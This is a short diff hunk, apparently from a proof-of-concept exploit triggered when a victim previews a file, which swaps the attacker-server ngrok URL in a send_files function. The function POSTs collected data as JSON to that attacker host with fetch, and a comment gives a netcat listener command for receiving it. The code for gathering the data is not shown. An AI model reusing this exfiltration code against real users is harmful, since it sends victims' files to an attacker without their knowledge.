@@ -38,7 +38,7 @@ just need to preview this file to see the magic
  
     function send_files(result){ 
          // need to set netcat to listen per example nc -lvvv 55555
-         let attacker_server =  'https://381b0aec.ngrok.io'
+         let attacker_server =  ' https://56051573.ngrok.io'
          fetch(attacker_server, {
                 method: 'post',
                 body: JSON.stringify(result)
